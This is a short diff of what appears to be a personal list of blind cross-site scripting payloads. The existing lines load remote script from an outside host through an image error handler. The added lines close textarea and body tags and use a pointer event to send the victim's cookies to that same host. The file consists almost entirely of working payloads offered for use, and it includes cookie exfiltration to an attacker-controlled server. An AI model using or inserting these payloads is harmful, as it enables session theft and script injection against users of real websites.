@@ -1,6 +1,9 @@
 My blind xss payload: '"></script/x><img/src/onerror=import('//bxss.xyz/')//
 '"></script/x><img/src/onerror=import('https://bxss.xyz/');//
 '"></script/x><img/src/onerror=import('//bxss.xyz/');//
+'\"></textarea></body><body onControl jhjhjshhs hello onpointerenter=(location=`https://bxss.xyz?c=`%2bcookie) 1>cookie
+XSS"></textarea></body><body onControl bnsddnedss hello onpointerenter=(location=`https://bxss.xyz?t=`+cookie) > cookie
+
 
 XSS Bypass:
 
